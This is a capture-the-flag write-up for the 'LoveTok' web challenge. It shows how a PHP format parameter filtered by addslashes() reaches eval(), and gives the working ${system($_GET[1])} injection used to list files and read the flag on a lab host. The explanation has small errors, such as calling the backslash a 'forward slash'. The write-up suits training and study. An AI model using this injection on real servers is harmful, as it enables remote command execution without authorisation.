---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Web: LoveTok

After clicking on the site, we can notice that URL was changed on clicking the button. `http://206.189.20.127:31160/?format=r`

Tracking this parameter in the code, we can find a TimeController class

```
$format = isset($_GET['format']) ? $_GET['format'] : 'r';
$time = new TimeModel($format);
```

## Bypass sanitisation

So it reads the input. But it is sanitised by `addslashes()` which will add a forward slash in front of ', ", , and NULL byte. By googling it we can find that this is [not secure at all](https://www.programmersought.com/article/30723400042/)!

Because we can still use a ${} substitution to go around it

```
$a = 1;
echo 'a is $a';   // result: a is $a
echo "a is $a";   // result: a is 1
echo "${a}bc";    // result: 1bc

function b()
{
  return "a";
}
echo "a is ${b()}";     // result: a is 1 as it gets a is $a 1st
```

## Eval

The format is then used in `eval()` function, which we will use for command execution.

```
public function getTime()
{
      eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
```

We **cannot use it directl**y due to the `addslashes()` like this: `http://206.189.20.127:31160/?format=${system("ls")}`

So we need to modify it to awouid qoutation marks `http://206.189.20.127:31160/?format=${system($_GET[1])}&1=ls+/` The `+` is URL encoded space That will give us the name of the flag file (which is again randomised)

With the name we can finally read it `http://206.189.20.127:31160/?format=${system($_GET[1])}&1=cat+flagepfnx`